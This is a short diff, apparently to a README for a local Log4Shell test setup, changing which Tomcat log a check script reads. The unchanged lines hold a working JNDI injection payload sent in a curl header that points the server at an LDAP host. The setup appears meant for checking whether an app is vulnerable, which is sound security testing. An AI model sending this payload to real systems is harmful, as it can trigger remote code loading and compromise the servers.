@@ -83,7 +83,7 @@ java -cp target/ldap-server-1.0-SNAPSHOT-jar-with-dependencies.jar LdapServer &
 ```
 (
   curl -H 'Header-poc: ${jndi:ldap://host:1389/a}' 'http://localhost:8080/myapp/' &>/dev/null && \
-  docker exec -it $(docker ps -lq) cat /usr/local/tomcat/logs/catalina.out | grep OBJECT-DESERIALIZED && echo '[!] HIGHLY VULNERABLE TO LOG4SHELL'
+  docker exec -it $(docker ps -lq) tail /usr/local/tomcat/logs/application.log | grep OBJECT-DESERIALIZED && echo '[!] HIGHLY VULNERABLE TO LOG4SHELL'
 )
 ```
 
